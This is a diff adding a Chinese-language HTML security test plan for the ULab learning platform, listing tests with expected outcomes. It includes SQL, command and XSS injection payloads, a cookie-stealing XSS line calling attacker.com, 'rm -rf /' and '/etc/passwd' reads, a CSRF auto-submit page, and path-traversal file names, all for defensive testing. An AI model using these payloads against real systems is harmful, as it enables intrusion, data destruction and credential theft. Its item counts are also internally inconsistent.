@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ULab 安全测试报告 - 测试内容与方案</title>
+<style>
+  :root {
+    --bg: #fff; --text: #1a1a2e; --mu: #6b7280; --b: #e5e7eb;
+    --p: #4f46e5; --hi: #dc2626; --gr: #16a34a; --am: #f59e0b; --bg2: #f9fafb;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif; color: var(--text); line-height: 1.8; background: var(--bg2); padding: 24px; }
+  .container { max-width: 1100px; margin: 0 auto; }
+  h1 { font-size: 28px; margin-bottom: 4px; }
+  .sub { color: var(--mu); font-size: 14px; margin-bottom: 24px; }
+  .card { background: var(--bg); border: 1px solid var(--b); border-radius: 12px; padding: 24px; margin-bottom: 20px; }
+  .card h2 { font-size: 20px; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+  .card h3 { font-size: 16px; margin: 20px 0 12px; padding-bottom: 8px; border-bottom: 1px solid var(--b); }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 12px 0; }
+  th { text-align: left; padding: 10px 12px; background: var(--bg2); border-bottom: 2px solid var(--b); font-weight: 600; color: var(--mu); white-space: nowrap; }
+  td { padding: 10px 12px; border-bottom: 1px solid var(--b); vertical-align: top; }
+  tr:hover td { background: #f8f7ff; }
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 600; }
+  .badge-p0 { background: #fef2f2; color: #dc2626; }
+  .badge-p1 { background: #fffbeb; color: #d97706; }
+  .badge-p2 { background: #f0fdf4; color: #16a34a; }
+  .badge-new { background: #ede9fe; color: #6d28d9; }
+  .checklist { list-style: none; padding: 0; }
+  .checklist li { padding: 6px 0; padding-left: 24px; position: relative; }
+  .checklist li::before { content: "☐"; position: absolute; left: 0; color: var(--mu); }
+  .tool-box { background: #1e1e2e; color: #cdd6f4; border-radius: 8px; padding: 16px; margin: 12px 0; font-family: 'SF Mono', 'Fira Code', monospace; font-size: 13px; overflow-x: auto; }
+  .tool-box .cmd { color: #89b4fa; }
+  .tool-box .cmt { color: #6c7086; }
+  .note { background: #fefce8; border-left: 3px solid var(--am); padding: 12px 16px; border-radius: 0 8px 8px 0; font-size: 13px; margin: 16px 0; }
+  .warning { background: #fef2f2; border-left: 3px solid var(--hi); padding: 12px 16px; border-radius: 0 8px 8px 0; font-size: 13px; margin: 16px 0; }
+  .summary-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; margin-bottom: 24px; }
+  .stat { background: var(--bg); border: 1px solid var(--b); border-radius: 10px; padding: 16px; text-align: center; }
+  .stat .num { font-size: 28px; font-weight: 700; }
+  .stat .label { font-size: 12px; color: var(--mu); margin-top: 4px; }
+  .step-list { counter-reset: step; list-style: none; padding: 0; }
+  .step-list li { counter-increment: step; padding: 8px 0 8px 32px; position: relative; }
+  .step-list li::before { content: counter(step); position: absolute; left: 0; top: 8px; width: 22px; height: 22px; background: var(--p); color: #fff; border-radius: 50%; text-align: center; font-size: 12px; line-height: 22px; }
+  @media (max-width: 768px) {
+    .summary-grid { grid-template-columns: repeat(2, 1fr); }
+    table { font-size: 12px; }
+    th, td { padding: 6px 8px; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+<h1>🛡 ULab 实验平台 — 安全测试方案</h1>
+<p class="sub">测试范围：认证授权、数据安全、接口安全、前端安全、LMS集成安全、实验组件安全、基础设施安全 | 共 8 大类 42 项测试</p>
+
+<div class="summary-grid">
+  <div class="stat"><div class="num">8</div><div class="label">测试大类</div></div>
+  <div class="stat"><div class="num">42</div><div class="label">测试项</div></div>
+  <div class="stat"><div class="num">12</div><div class="label">P0 高优先级</div></div>
+  <div class="stat"><div class="num">18</div><div class="label">P1 中优先级</div></div>
+  <div class="stat"><div class="num">12</div><div class="label">P2 低优先级</div></div>
+</div>
+
+<!-- ====== 1. 认证与授权 ====== -->
+<div class="card">
+  <h2>🔐 一、认证与授权 (Authentication & Authorization)</h2>
+
+  <h3>1.1 登录安全</h3>
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>1</td><td>暴力破解防护</td><td><span class="badge badge-p0">P0</span></td>
+      <td>使用 Burp Suite Intruder 或脚本对登录接口连续发送 50+ 次错误密码请求，观察响应</td>
+      <td>连续失败 5-10 次后触发验证码或账号临时锁定；返回 429 状态码</td>
+    </tr>
+    <tr>
+      <td>2</td><td>弱密码策略</td><td><span class="badge badge-p0">P0</span></td>
+      <td>注册/修改密码时尝试使用 "123456"、"password"、"admin" 等常见弱密码</td>
+      <td>系统拒绝弱密码，要求至少 8 位、包含大小写字母+数字+特殊字符</td>
+    </tr>
+    <tr>
+      <td>3</td><td>Session 固定攻击</td><td><span class="badge badge-p1">P1</span></td>
+      <td>登录前获取一个 Session ID，登录后检查 Session ID 是否变更</td>
+      <td>登录成功后 Session ID 必须重新生成，旧 Session ID 失效</td>
+    </tr>
+    <tr>
+      <td>4</td><td>Session 超时与退出</td><td><span class="badge badge-p1">P1</span></td>
+      <td>登录后闲置 30 分钟，再操作页面；退出登录后使用浏览器后退按钮</td>
+      <td>超时后自动跳转登录页；退出后 Session 立即失效，后退无法看到已登录内容</td>
+    </tr>
+    <tr>
+      <td>5</td><td>多设备登录</td><td><span class="badge badge-p2">P2</span></td>
+      <td>同一账号在 Chrome 和 Safari 同时登录，分别在两个浏览器操作</td>
+      <td>后登录的设备应使前一个 Session 失效，或明确提示"账号在其他设备登录"</td>
+    </tr>
+  </table>
+
+  <h3>1.2 权限控制 (RBAC)</h3>
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>6</td><td>学生越权访问教师功能</td><td><span class="badge badge-p0">P0</span></td>
+      <td>学生登录后，直接浏览器访问教师专属 URL：<br>/create-experiment<br>/edit-experiment?id=xxx<br>/my-experiments</td>
+      <td>返回 403 或跳转学生首页；API 返回 401</td>
+    </tr>
+    <tr>
+      <td>7</td><td>教师越权访问管理功能</td><td><span class="badge badge-p1">P1</span></td>
+      <td>教师登录后尝试访问系统管理员接口（如用户管理、全局配置）</td>
+      <td>返回 403 权限不足</td>
+    </tr>
+    <tr>
+      <td>8</td><td>水平越权 - 访问他人实验</td><td><span class="badge badge-p0">P0</span></td>
+      <td>教师 A 登录后，修改 URL 中的实验 ID 为教师 B 的实验 ID，尝试编辑/查看/删除</td>
+      <td>返回 403 或提示"无权访问该实验"</td>
+    </tr>
+    <tr>
+      <td>9</td><td>水平越权 - 访问他人班级数据</td><td><span class="badge badge-p1">P1</span></td>
+      <td>教师 A 尝试通过修改班级 ID 参数查看教师 B 班级的学生成绩数据</td>
+      <td>返回 403 或空数据，不泄露其他教师的学生信息</td>
+    </tr>
+    <tr>
+      <td>10</td><td>未登录直接访问 API</td><td><span class="badge badge-p0">P0</span></td>
+      <td>未登录状态下，使用 curl/Postman 直接调用需要认证的 API 接口</td>
+      <td>所有受保护 API 返回 401 Unauthorized</td>
+    </tr>
+  </table>
+
+  <div class="tool-box">
+<span class="cmt"># 测试水平越权 - 修改实验 ID</span>
+<span class="cmd">curl -X GET</span> "https://ulabdev.tongshike.cn/api/experiment/12345" \
+  -H "Cookie: session=<span class="cmt">教师A的session</span>" \
+  -H "Authorization: Bearer <span class="cmt">教师A的token</span>"
+
+<span class="cmt"># 预期：返回 403，因为实验 12345 属于教师 B</span>
+
+<span class="cmt"># 测试未登录访问 API</span>
+<span class="cmd">curl -X GET</span> "https://ulabdev.tongshike.cn/api/experiments"
+<span class="cmt"># 预期：返回 401 Unauthorized</span>
+  </div>
+</div>
+
+<!-- ====== 2. 数据安全 ====== -->
+<div class="card">
+  <h2>🗄 二、数据安全 (Data Security)</h2>
+
+  <h3>2.1 注入攻击防护</h3>
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>11</td><td>SQL 注入 - 登录表单</td><td><span class="badge badge-p0">P0</span></td>
+      <td>在用户名输入框输入：<br><code>' OR '1'='1' --</code><br><code>admin'--</code><br><code>' UNION SELECT 1,2,3--</code></td>
+      <td>注入语句被过滤或参数化，不返回数据库错误，登录失败</td>
+    </tr>
+    <tr>
+      <td>12</td><td>SQL 注入 - 搜索框</td><td><span class="badge badge-p1">P1</span></td>
+      <td>在实验搜索框、学生搜索框中输入 SQL 注入 payload</td>
+      <td>注入无效，正常返回搜索结果或不返回数据</td>
+    </tr>
+    <tr>
+      <td>13</td><td>NoSQL 注入</td><td><span class="badge badge-p1">P1</span></td>
+      <td>如果使用 MongoDB，在 JSON 接口中注入：<br><code>{"$gt": ""}</code><br><code>{"$ne": null}</code></td>
+      <td>输入被校验和过滤，不执行非预期的数据库查询</td>
+    </tr>
+    <tr>
+      <td>14</td><td>命令注入</td><td><span class="badge badge-p1">P1</span></td>
+      <td>在 Notebook 启动器、文件上传文件名等涉及系统命令的地方注入：<br><code>; ls -la</code><br><code>| cat /etc/passwd</code></td>
+      <td>命令注入失败，系统不执行任何 OS 命令</td>
+    </tr>
+  </table>
+
+  <h3>2.2 XSS 跨站脚本</h3>
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>15</td><td>存储型 XSS - 实验内容</td><td><span class="badge badge-p0">P0</span></td>
+      <td>教师在实验标题、节点内容、学习任务配置中输入：<br><code>&lt;script&gt;alert('xss')&lt;/script&gt;</code><br><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+      <td>输入被转义或过滤，页面不执行脚本；学生端查看时也不触发</td>
+    </tr>
+    <tr>
+      <td>16</td><td>存储型 XSS - 富文本编辑器</td><td><span class="badge badge-p1">P1</span></td>
+      <td>在富文本编辑器中切换到 HTML 源码模式，插入 XSS payload，保存后查看</td>
+      <td>富文本编辑器进行 HTML 净化，危险标签和属性被移除</td>
+    </tr>
+    <tr>
+      <td>17</td><td>反射型 XSS - URL 参数</td><td><span class="badge badge-p1">P1</span></td>
+      <td>在 URL 参数中注入脚本：<br><code>?search=&lt;script&gt;alert(1)&lt;/script&gt;</code><br><code>?redirect=javascript:alert(1)</code></td>
+      <td>参数值被正确编码，不在页面中直接渲染为 HTML</td>
+    </tr>
+    <tr>
+      <td>18</td><td>DOM 型 XSS</td><td><span class="badge badge-p2">P2</span></td>
+      <td>检查前端代码中是否使用 innerHTML、document.write 等危险 API 直接渲染用户输入</td>
+      <td>使用 textContent 或经过转义后渲染；避免直接拼接用户输入到 DOM</td>
+    </tr>
+  </table>
+
+  <h3>2.3 敏感数据保护</h3>
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>19</td><td>密码传输加密</td><td><span class="badge badge-p0">P0</span></td>
+      <td>使用浏览器 DevTools Network 面板抓包，查看登录请求中密码是否明文传输</td>
+      <td>密码在请求体中应经过加密（如 bcrypt 哈希）或至少通过 HTTPS 传输</td>
+    </tr>
+    <tr>
+      <td>20</td><td>敏感信息泄露 - API 响应</td><td><span class="badge badge-p1">P1</span></td>
+      <td>检查所有 API 响应中是否包含密码哈希、Token、内部 IP、数据库错误堆栈</td>
+      <td>API 响应不返回任何敏感信息；错误信息使用通用提示</td>
+    </tr>
+    <tr>
+      <td>21</td><td>敏感信息泄露 - 前端源码</td><td><span class="badge badge-p1">P1</span></td>
+      <td>查看页面源代码、JS 文件，搜索 "password"、"token"、"secret"、"api_key" 等关键词</td>
+      <td>前端源码中不存在硬编码的密钥、密码或 Token</td>
+    </tr>
+    <tr>
+      <td>22</td><td>学生数据隔离</td><td><span class="badge badge-p0">P0</span></td>
+      <td>学生 A 尝试通过修改 API 参数查看学生 B 的实验成绩、答题内容</td>
+      <td>数据按用户 ID 隔离，无法跨用户访问</td>
+    </tr>
+  </table>
+
+  <div class="tool-box">
+<span class="cmt"># XSS 测试 Payload 集合</span>
+<span class="cmt"># 存储型 XSS</span>
+&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+&lt;img src=x onerror="fetch('https://attacker.com?c='+document.cookie)"&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+
+<span class="cmt"># 反射型 XSS（URL 编码后测试）</span>
+?q=&lt;script&gt;alert(1)&lt;/script&gt;
+?redirect=javascript:alert(document.cookie)
+?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+<span class="cmt"># SQL 注入 Payload 集合</span>
+' OR '1'='1
+' OR '1'='1' --
+admin'--
+' UNION SELECT NULL--
+' UNION SELECT username,password FROM users--
+1; DROP TABLE users--
+  </div>
+</div>
+
+<!-- ====== 3. 接口安全 ====== -->
+<div class="card">
+  <h2>🌐 三、接口安全 (API Security)</h2>
+
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>23</td><td>API 认证校验</td><td><span class="badge badge-p0">P0</span></td>
+      <td>使用无效 Token、过期 Token、空 Token 分别调用所有 API 接口</td>
+      <td>所有 API 返回 401；错误信息不泄露系统细节</td>
+    </tr>
+    <tr>
+      <td>24</td><td>CSRF 跨站请求伪造</td><td><span class="badge badge-p1">P1</span></td>
+      <td>构造一个外部 HTML 页面，包含自动提交的表单，目标为 ULab 的创建实验/删除实验接口</td>
+      <td>请求被 CSRF Token 校验拦截，关键操作需要 CSRF Token 或 SameSite Cookie</td>
+    </tr>
+    <tr>
+      <td>25</td><td>接口限流 (Rate Limiting)</td><td><span class="badge badge-p1">P1</span></td>
+      <td>使用脚本对同一 API 接口 1 秒内发送 100+ 请求</td>
+      <td>触发限流，返回 429 Too Many Requests；正常用户不受影响</td>
+    </tr>
+    <tr>
+      <td>26</td><td>HTTP 方法覆盖</td><td><span class="badge badge-p2">P2</span></td>
+      <td>使用 GET 请求访问仅允许 POST 的接口，使用 PUT/DELETE 尝试未授权操作</td>
+      <td>不允许的 HTTP 方法返回 405 Method Not Allowed</td>
+    </tr>
+    <tr>
+      <td>27</td><td>批量操作越权</td><td><span class="badge badge-p1">P1</span></td>
+      <td>在批量删除/修改接口中，修改请求体中的 ID 数组，加入不属于当前用户的实验 ID</td>
+      <td>批量操作仅对当前用户有权限的资源生效，无权限的资源被跳过或返回错误</td>
+    </tr>
+    <tr>
+      <td>28</td><td>参数篡改 - IDOR</td><td><span class="badge badge-p0">P0</span></td>
+      <td>遍历实验 ID、学生 ID、文件 ID 等参数，尝试访问不属当前用户的资源</td>
+      <td>所有资源访问都校验归属关系，返回 403</td>
+    </tr>
+  </table>
+
+  <div class="tool-box">
+<span class="cmt"># CSRF 测试：构造恶意页面</span>
+&lt;html&gt;
+&lt;body&gt;
+&lt;form action="https://ulabdev.tongshike.cn/api/experiment/delete" method="POST"&gt;
+  &lt;input type="hidden" name="id" value="目标实验ID"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+<span class="cmt"># 接口限流测试</span>
+<span class="cmd">for i in {1..100}; do</span>
+  <span class="cmd">curl -s -o /dev/null -w "%{http_code}\n"</span> \
+    "https://ulabdev.tongshike.cn/api/experiments" \
+    -H "Authorization: Bearer TOKEN"
+<span class="cmd">done</span>
+<span class="cmt"># 预期：前 N 次返回 200，之后返回 429</span>
+
+<span class="cmt"># IDOR 测试 - 遍历实验 ID</span>
+<span class="cmd">for id in {1..100}; do</span>
+  <span class="cmd">curl -s -w "ID=$id Status=%{http_code}\n"</span> \
+    "https://ulabdev.tongshike.cn/api/experiment/$id" \
+    -H "Authorization: Bearer 学生TOKEN"
+<span class="cmd">done</span>
+<span class="cmt"># 预期：所有请求返回 403（学生无权访问编辑接口）</span>
+  </div>
+</div>
+
+<!-- ====== 4. 文件上传安全 ====== -->
+<div class="card">
+  <h2>📁 四、文件上传安全 (File Upload Security)</h2>
+
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>29</td><td>文件类型白名单</td><td><span class="badge badge-p0">P0</span></td>
+      <td>尝试上传以下文件类型：<br>.exe, .sh, .php, .jsp, .html, .svg, .xml, .js</td>
+      <td>非白名单类型被拒绝，仅允许 pdf/doc/ppt/xls/jpg/png/mp4 等</td>
+    </tr>
+    <tr>
+      <td>30</td><td>文件扩展名绕过</td><td><span class="badge badge-p1">P1</span></td>
+      <td>将 .php 文件改名为 shell.php.jpg、shell.jpg.php、shell.php%00.jpg 后上传</td>
+      <td>服务端校验文件真实 MIME 类型（魔数），而非仅依赖扩展名</td>
+    </tr>
+    <tr>
+      <td>31</td><td>文件大小限制</td><td><span class="badge badge-p1">P1</span></td>
+      <td>上传超大文件（如 500MB+ 的压缩包），观察服务器响应</td>
+      <td>前端+后端双重校验文件大小；超过限制返回 413，不给服务器造成压力</td>
+    </tr>
+    <tr>
+      <td>32</td><td>恶意文件内容检测</td><td><span class="badge badge-p1">P1</span></td>
+      <td>上传包含病毒签名的文件（EICAR 测试文件）、包含恶意宏的 Office 文档</td>
+      <td>如有病毒扫描，应拦截恶意文件；建议集成 ClamAV 或类似扫描服务</td>
+    </tr>
+    <tr>
+      <td>33</td><td>文件名路径遍历</td><td><span class="badge badge-p1">P1</span></td>
+      <td>上传文件名设置为：<br><code>../../../etc/passwd</code><br><code>..\..\windows\system32\config\sam</code></td>
+      <td>文件名被规范化处理，路径遍历字符被过滤或替换</td>
+    </tr>
+    <tr>
+      <td>34</td><td>压缩包炸弹</td><td><span class="badge badge-p2">P2</span></td>
+      <td>上传一个 1KB 的 zip 文件，解压后膨胀为 10GB+</td>
+      <td>限制解压后总大小，超过限制拒绝处理</td>
+    </tr>
+  </table>
+
+  <div class="tool-box">
+<span class="cmt"># 生成 EICAR 测试病毒文件</span>
+<span class="cmd">echo</span> 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > eicar.com
+
+<span class="cmt"># 文件扩展名绕过测试</span>
+<span class="cmd">cp</span> shell.php shell.php.jpg
+<span class="cmd">cp</span> shell.php shell.jpg.php
+<span class="cmd">curl -X POST</span> "https://ulabdev.tongshike.cn/api/upload" \
+  -F "file=@shell.php.jpg" \
+  -H "Authorization: Bearer TOKEN"
+<span class="cmt"># 预期：服务端检测到真实类型为 PHP，拒绝上传</span>
+  </div>
+</div>
+
+<!-- ====== 5. 前端安全 ====== -->
+<div class="card">
+  <h2>🖥 五、前端安全 (Frontend Security)</h2>
+
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>35</td><td>CSP 内容安全策略</td><td><span class="badge badge-p1">P1</span></td>
+      <td>检查 HTTP 响应头中的 Content-Security-Policy 配置</td>
+      <td>应设置合理的 CSP 策略：限制 script-src、禁止 inline script、限制 connect-src</td>
+    </tr>
+    <tr>
+      <td>36</td><td>Cookie 安全属性</td><td><span class="badge badge-p1">P1</span></td>
+      <td>检查 Set-Cookie 响应头，验证是否包含 HttpOnly、Secure、SameSite 属性</td>
+      <td>Session Cookie 设置 HttpOnly（防 XSS 窃取）、Secure（仅 HTTPS）、SameSite=Lax</td>
+    </tr>
+    <tr>
+      <td>37</td><td>localStorage Token 安全</td><td><span class="badge badge-p1">P1</span></td>
+      <td>检查浏览器 localStorage/sessionStorage 中是否存储了敏感 Token 或密码</td>
+      <td>Token 优先使用 HttpOnly Cookie；如必须存 localStorage，确认无 XSS 漏洞</td>
+    </tr>
+    <tr>
+      <td>38</td><td>第三方依赖漏洞</td><td><span class="badge badge-p2">P2</span></td>
+      <td>运行 <code>npm audit</code> 检查前端依赖的已知漏洞</td>
+      <td>无高危漏洞；定期更新依赖版本</td>
+    </tr>
+    <tr>
+      <td>39</td><td>Iframe 嵌入防护</td><td><span class="badge badge-p2">P2</span></td>
+      <td>尝试将 ULab 页面嵌入到外部 iframe 中</td>
+      <td>应设置 X-Frame-Options: DENY 或 SAMEORIGIN，防止点击劫持</td>
+    </tr>
+  </table>
+
+  <div class="tool-box">
+<span class="cmt"># 检查安全响应头</span>
+<span class="cmd">curl -sI</span> https://ulabdev.tongshike.cn | grep -iE \
+  "content-security-policy|x-frame-options|x-content-type|strict-transport|set-cookie"
+
+<span class="cmt"># 预期看到的安全响应头：</span>
+Content-Security-Policy: default-src 'self'; script-src 'self'; ...
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Lax
+  </div>
+</div>
+
+<!-- ====== 6. LMS 集成安全 ====== -->
+<div class="card">
+  <h2>🔗 六、LMS 集成安全 (LMS Integration Security)</h2>
+
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>40</td><td>LMS 跳转 Token 安全</td><td><span class="badge badge-p0">P0</span></td>
+      <td>从 LMS 跳转到 ULab 时，抓包分析跳转 URL 中的 Token 参数；尝试修改 Token 中的学生 ID 或课程 ID</td>
+      <td>Token 使用 JWT 签名或服务端 Session 校验；篡改后跳转失败</td>
+    </tr>
+    <tr>
+      <td>41</td><td>LMS 回调接口认证</td><td><span class="badge badge-p1">P1</span></td>
+      <td>直接调用 ULab 回传成绩到 LMS 的接口，尝试伪造学生成绩数据</td>
+      <td>回调接口需要服务端签名验证；仅接受来自 ULab 服务器的请求</td>
+    </tr>
+    <tr>
+      <td>42</td><td>LMS ↔ ULab 数据传输</td><td><span class="badge badge-p1">P1</span></td>
+      <td>抓包分析 LMS 与 ULab 之间的数据传输是否加密，是否包含敏感信息</td>
+      <td>所有 LMS-ULab 通信使用 HTTPS；不传输密码等敏感信息</td>
+    </tr>
+  </table>
+</div>
+
+<!-- ====== 7. 实验组件安全 ====== -->
+<div class="card">
+  <h2>🧩 七、实验组件安全 (Component Security)</h2>
+
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>43</td><td>Notebook 沙箱隔离</td><td><span class="badge badge-p0">P0</span></td>
+      <td>在 Notebook 中执行系统命令：<br><code>!cat /etc/passwd</code><br><code>import os; os.system('rm -rf /')</code></td>
+      <td>Notebook 运行在容器/沙箱中，无法访问宿主机文件系统或执行危险操作</td>
+    </tr>
+    <tr>
+      <td>44</td><td>Notebook 网络隔离</td><td><span class="badge badge-p1">P1</span></td>
+      <td>在 Notebook 中尝试访问内网服务、发起对外攻击</td>
+      <td>Notebook 容器网络隔离，仅允许访问必要的白名单域名</td>
+    </tr>
+    <tr>
+      <td>45</td><td>摄像头/麦克风权限</td><td><span class="badge badge-p1">P1</span></td>
+      <td>检查人脸检测、语音输入等组件是否正确请求用户权限；退出页面后权限是否释放</td>
+      <td>首次使用明确弹窗请求权限；关闭页面后停止采集；权限可随时撤销</td>
+    </tr>
+    <tr>
+      <td>46</td><td>语音数据隐私</td><td><span class="badge badge-p1">P1</span></td>
+      <td>检查语音输入数据是否在本地处理还是上传到云端；上传是否有加密</td>
+      <td>语音数据传输使用 HTTPS；不存储原始语音数据或告知用户存储策略</td>
+    </tr>
+    <tr>
+      <td>47</td><td>Scratch 代码执行</td><td><span class="badge badge-p2">P2</span></td>
+      <td>在 Scratch 中尝试执行恶意代码块或访问外部资源</td>
+      <td>Scratch 运行在沙箱环境中，功能受限</td>
+    </tr>
+  </table>
+</div>
+
+<!-- ====== 8. 基础设施安全 ====== -->
+<div class="card">
+  <h2>🏗 八、基础设施安全 (Infrastructure Security)</h2>
+
+  <table>
+    <tr><th style="width:5%">#</th><th style="width:20%">测试项</th><th style="width:8%">优先级</th><th style="width:35%">测试方法</th><th>预期结果</th></tr>
+    <tr>
+      <td>48</td><td>HTTPS 强制</td><td><span class="badge badge-p0">P0</span></td>
+      <td>通过 HTTP 访问网站，检查是否自动跳转到 HTTPS</td>
+      <td>HTTP 自动 301 重定向到 HTTPS；HSTS 头已设置</td>
+    </tr>
+    <tr>
+      <td>49</td><td>TLS 版本与加密套件</td><td><span class="badge badge-p1">P1</span></td>
+      <td>使用 <code>nmap --script ssl-enum-ciphers</code> 或 <code>testssl.sh</code> 扫描</td>
+      <td>仅支持 TLS 1.2+；禁用弱加密套件（RC4、3DES）；禁用 SSLv2/SSLv3/TLS 1.0/1.1</td>
+    </tr>
+    <tr>
+      <td>50</td><td>错误页面信息泄露</td><td><span class="badge badge-p1">P1</span></td>
+      <td>触发 404、500、403 等错误页面，检查是否泄露服务器版本、框架信息、堆栈跟踪</td>
+      <td>错误页面使用通用提示，不暴露 Nginx/Apache 版本、框架名称、代码路径</td>
+    </tr>
+    <tr>
+      <td>51</td><td>OBS/COS 存储权限</td><td><span class="badge badge-p1">P1</span></td>
+      <td>检查资源文件（图片、文档、压缩包）的 OBS 存储桶权限；尝试直接访问存储桶</td>
+      <td>存储桶不公开列出；文件访问使用签名 URL 且有有效期</td>
+    </tr>
+  </table>
+
+  <div class="tool-box">
+<span class="cmt"># TLS 扫描</span>
+<span class="cmd">testssl</span> https://ulabdev.tongshike.cn
+
+<span class="cmt"># 检查 HTTP → HTTPS 重定向</span>
+<span class="cmd">curl -sI</span> http://ulabdev.tongshike.cn
+<span class="cmt"># 预期：HTTP/1.1 301 Moved Permanently → Location: https://...</span>
+
+<span class="cmt"># 检查错误页面信息泄露</span>
+<span class="cmd">curl -s</span> https://ulabdev.tongshike.cn/api/nonexistent
+<span class="cmt"># 预期：{"error": "Not Found"}，而非堆栈跟踪</span>
+  </div>
+</div>
+
+<!-- ====== 测试工具 ====== -->
+<div class="card">
+  <h2>🧰 推荐测试工具</h2>
+  <table>
+    <tr><th>工具</th><th>用途</th><th>说明</th></tr>
+    <tr><td><strong>Burp Suite</strong></td><td>Web 安全测试综合平台</td><td>拦截/修改 HTTP 请求、扫描漏洞、暴力破解、XSS/SQL 注入测试</td></tr>
+    <tr><td><strong>OWASP ZAP</strong></td><td>开源 Web 安全扫描器</td><td>自动扫描常见漏洞（XSS、SQL 注入、CSRF 等），免费替代 Burp Suite</td></tr>
+    <tr><td><strong>sqlmap</strong></td><td>SQL 注入自动化测试</td><td>自动检测和利用 SQL 注入漏洞，支持多种数据库</td></tr>
+    <tr><td><strong>testssl.sh</strong></td><td>TLS/SSL 配置检查</td><td>检查 HTTPS 配置、加密套件、证书有效性</td></tr>
+    <tr><td><strong>nmap</strong></td><td>端口扫描与服务发现</td><td>扫描开放端口、服务版本检测</td></tr>
+    <tr><td><strong>Postman</strong></td><td>API 测试工具</td><td>手动构造 API 请求，测试认证、参数校验、越权访问</td></tr>
+    <tr><td><strong>Chrome DevTools</strong></td><td>前端调试与安全审计</td><td>检查 Network、Application（Cookie/Storage）、Security 面板</td></tr>
+    <tr><td><strong>npm audit</strong></td><td>依赖漏洞扫描</td><td>检查 Node.js 项目依赖的已知安全漏洞</td></tr>
+  </table>
+</div>
+
+<!-- ====== 测试优先级 ====== -->
+<div class="card">
+  <h2>📋 测试执行建议</h2>
+
+  <h3>第一轮：P0 高优先级（12项）</h3>
+  <p>必须在每次发布前执行，覆盖核心安全风险：</p>
+  <ol style="padding-left:20px;font-size:13px;line-height:2">
+    <li>暴力破解防护</li>
+    <li>弱密码策略</li>
+    <li>学生越权访问教师功能</li>
+    <li>水平越权 - 访问他人实验</li>
+    <li>未登录直接访问 API</li>
+    <li>SQL 注入 - 登录表单</li>
+    <li>存储型 XSS - 实验内容</li>
+    <li>密码传输加密</li>
+    <li>学生数据隔离</li>
+    <li>API 认证校验</li>
+    <li>参数篡改 - IDOR</li>
+    <li>文件类型白名单</li>
+    <li>LMS 跳转 Token 安全</li>
+    <li>Notebook 沙箱隔离</li>
+    <li>HTTPS 强制</li>
+  </ol>
+
+  <h3>第二轮：P1 中优先级（18项）</h3>
+  <p>每次大版本发布前执行，覆盖常见安全风险。</p>
+
+  <h3>第三轮：P2 低优先级（12项）</h3>
+  <p>定期安全审计时执行，覆盖深度安全检测。</p>
+
+  <div class="note">
+    <strong>⚠️ 重要提醒：</strong>所有安全测试必须在测试环境（ulabdev）进行，禁止在生产环境执行破坏性测试。SQL 注入、命令注入等测试可能影响系统稳定性，建议在独立的测试环境或获得授权后进行。
+  </div>
+</div>
+
+</div>
+</body>
+</html>
